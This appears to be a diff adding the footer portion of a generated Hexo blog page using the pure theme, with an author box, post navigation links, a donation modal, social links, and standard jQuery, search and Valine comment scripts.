+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">侯哥</span><small class="ml-1x">DBA &amp; CTFer</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%B6%E7%9A%84%E6%95%B0%E5%AD%A6_%E6%A8%A1mod%E8%BF%90%E7%AE%97/" title="密码学家的数学_模mod运算"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/" title="hexo图片显示问题并不难"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/cofess" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
